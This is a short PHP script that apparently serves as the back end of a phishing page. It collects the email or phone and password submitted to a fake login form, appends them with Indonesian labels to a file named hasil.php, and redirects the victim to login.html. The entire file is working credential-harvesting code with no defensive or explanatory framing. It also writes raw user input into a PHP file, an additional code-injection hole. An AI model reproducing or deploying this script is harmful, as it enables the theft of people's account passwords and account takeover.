<?php
header ("Location: login.html");
$ADEx = "hasil.php";
$ADEy = $_POST['email'];
$ADEz = $_POST['password'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email atau Telepon : ");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi         : ");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
